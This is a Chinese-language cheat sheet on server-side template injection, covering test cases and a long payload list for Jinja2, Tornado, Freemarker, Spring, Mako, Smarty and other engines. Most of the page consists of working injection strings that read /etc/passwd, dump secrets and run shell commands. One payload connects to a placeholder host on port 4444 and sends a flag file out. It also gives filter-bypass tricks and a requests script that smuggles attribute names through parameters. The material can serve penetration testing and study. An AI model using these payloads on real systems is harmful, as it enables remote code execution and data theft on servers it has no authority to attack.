模版注入
========================================

简介
----------------------------------------
模板引擎用于使用动态数据呈现内容。此上下文数据通常由用户控制并由模板进行格式化，以生成网页、电子邮件等。模板引擎通过使用代码构造（如条件语句、循环等）处理上下文数据，允许在模板中使用强大的语言表达式，以呈现动态内容。如果攻击者能够控制要呈现的模板，则他们将能够注入可暴露上下文数据，甚至在服务器上运行任意命令的表达式。

测试方法
----------------------------------------
- 确定使用的引擎
- 查看引擎相关的文档，确定其安全机制以及自带的函数和变量
- 需找攻击面，尝试攻击

测试用例
----------------------------------------
- 简单的数学表达式，``{{ 7+7 }} => 14``
- 字符串表达式 ``{{ "ajin" }} => ajin``
- Ruby
    - ``<%= 7 * 7 %>``
    - ``<%= File.open('/etc/passwd').read %>``
- Java
    - ``${7*7}``
- Twig
    - ``{{7*7}}``
- Smarty
    - ``{php}echo `id`;{/php}``
- AngularJS
    - ``$eval('1+1')``
- Tornado
    - 引用模块 ``{% import module %}``
    - => ``{% import os %}{{ os.popen("whoami").read() }}``
- Flask/Jinja2
    - ``{{ config.items() }}``
    - ``{{''.__class__.__mro__[-1].__subclasses__()}}``
	- 示例
		+ {{%22%22.__class__.__mro__[-1].__subclasses__()[183].__init__.__globals__[%27__builtins__%27][%27eval%27](%22__import__(%27os%27).popen(%27whoami%27).read()%22)}}
- Django
    - ``{{ request }}``
    - ``{% debug %}``
    - ``{% load module %}``
    - ``{% include "x.html" %}``
    - ``{% extends "x.html" %}``
	
payload
----------------------------------------
::

	{{4*4}}[[5*5]]
	{{7*7}}
	{{7*'7'}}
	<%= 7 * 7 %>
	${3*3}
	${{7*7}}
	@(1+2)
	#{3*3}
	#{ 7 * 7 }
	{{dump(app)}}
	{{app.request.server.all|join(',')}}
	{{config.items()}}
	{{ [].class.base.subclasses() }}
	{{''.class.mro()[1].subclasses()}}
	{{ ''.__class__.__mro__[2].__subclasses__() }}
	{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}
	{{'a'.toUpperCase()}} 
	{{ request }}
	{{self}}
	<%= File.open('/etc/passwd').read %>
	<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
	[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
	${"freemarker.template.utility.Execute"?new()("id")}
	{{app.request.query.filter(0,0,1024,{'options':'system'})}}
	{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
	{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}
	{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
	{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
	{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
	{$smarty.version}
	{php}echo `id`;{/php}
	{{['id']|filter('system')}}
	{{['cat\x20/etc/passwd']|filter('system')}}
	{{['cat$IFS/etc/passwd']|filter('system')}}
	{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
	{{request|attr(["_"*2,"class","_"*2]|join)}}
	{{request|attr(["__","class","__"]|join)}}
	{{request|attr("__class__")}}
	{{request.__class__}}
	{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
	{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
	{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
	{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
	{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
	{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
	${T(java.lang.System).getenv()}
	${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
	${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}${self.module.cache.util.os.system("id")}
	${self.module.runtime.util.os.system("id")}
	${self.template.module.cache.util.os.system("id")}
	${self.module.cache.compat.inspect.os.system("id")}
	${self.__init__.__globals__['util'].os.system('id')}
	${self.template.module.runtime.util.os.system("id")}
	${self.module.filters.compat.inspect.os.system("id")}
	${self.module.runtime.compat.inspect.os.system("id")}
	${self.module.runtime.exceptions.util.os.system("id")}
	${self.template.__init__.__globals__['os'].system('id')}
	${self.module.cache.util.compat.inspect.os.system("id")}
	${self.module.runtime.util.compat.inspect.os.system("id")}
	${self.template._mmarker.module.cache.util.os.system("id")}
	${self.template.module.cache.compat.inspect.os.system("id")}
	${self.module.cache.compat.inspect.linecache.os.system("id")}
	${self.template._mmarker.module.runtime.util.os.system("id")}
	${self.attr._NSAttr__parent.module.cache.util.os.system("id")}
	${self.template.module.filters.compat.inspect.os.system("id")}
	${self.template.module.runtime.compat.inspect.os.system("id")}
	${self.module.filters.compat.inspect.linecache.os.system("id")}
	${self.module.runtime.compat.inspect.linecache.os.system("id")}
	${self.template.module.runtime.exceptions.util.os.system("id")}
	${self.attr._NSAttr__parent.module.runtime.util.os.system("id")}
	${self.context._with_template.module.cache.util.os.system("id")}
	${self.module.runtime.exceptions.compat.inspect.os.system("id")}
	${self.template.module.cache.util.compat.inspect.os.system("id")}
	${self.context._with_template.module.runtime.util.os.system("id")}
	${self.module.cache.util.compat.inspect.linecache.os.system("id")}
	${self.template.module.runtime.util.compat.inspect.os.system("id")}
	${self.module.runtime.util.compat.inspect.linecache.os.system("id")}
	${self.module.runtime.exceptions.traceback.linecache.os.system("id")}
	${self.module.runtime.exceptions.util.compat.inspect.os.system("id")}
	${self.template._mmarker.module.cache.compat.inspect.os.system("id")}
	${self.template.module.cache.compat.inspect.linecache.os.system("id")}
	${self.attr._NSAttr__parent.template.module.cache.util.os.system("id")}
	${self.template._mmarker.module.filters.compat.inspect.os.system("id")}
	${self.template._mmarker.module.runtime.compat.inspect.os.system("id")}
	${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system("id")}
	${self.template._mmarker.module.runtime.exceptions.util.os.system("id")}
	${self.template.module.filters.compat.inspect.linecache.os.system("id")}
	${self.template.module.runtime.compat.inspect.linecache.os.system("id")}
	${self.attr._NSAttr__parent.template.module.runtime.util.os.system("id")}
	${self.context._with_template._mmarker.module.cache.util.os.system("id")}
	${self.template.module.runtime.exceptions.compat.inspect.os.system("id")}
	${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system("id")}
	${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system("id")}
	${self.context._with_template.module.cache.compat.inspect.os.system("id")}
	${self.module.runtime.exceptions.compat.inspect.linecache.os.system("id")}
	${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system("id")}
	${self.context._with_template._mmarker.module.runtime.util.os.system("id")}
	${self.context._with_template.module.filters.compat.inspect.os.system("id")}
	${self.context._with_template.module.runtime.compat.inspect.os.system("id")}
	${self.context._with_template.module.runtime.exceptions.util.os.system("id")}
	${self.template.module.runtime.exceptions.traceback.linecache.os.system("id")}
	{{self._TemplateReference__context.cycler.__init__.__globals__.os}}
	{{self._TemplateReference__context.joiner.__init__.__globals__.os}}
	{{self._TemplateReference__context.namespace.__init__.__globals__.os}}
	{{cycler.__init__.__globals__.os}}
	{{joiner.__init__.__globals__.os}}
	{{namespace.__init__.__globals__.os}}

绕过技巧
----------------------------------------

字符串拼接
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
``request['__cl'+'ass__'].__base__.__base__.__base__['__subcla'+'sses__']()[60]``

使用参数绕过
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::

    params = {
        'clas': '__class__',
        'mr': '__mro__',
        'subc': '__subclasses__'
    }
    data = {
        "data": "{{''[request.args.clas][request.args.mr][1][request.args.subc]()}}"
    }
    r = requests.post(url, params=params, data=data)
    print(r.text)

参考链接
----------------------------------------
- `服务端模版注入 <https://zhuanlan.zhihu.com/p/28823933>`_
- `用Python特性任意代码执行 <http://blog.knownsec.com/2016/02/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates/>`_
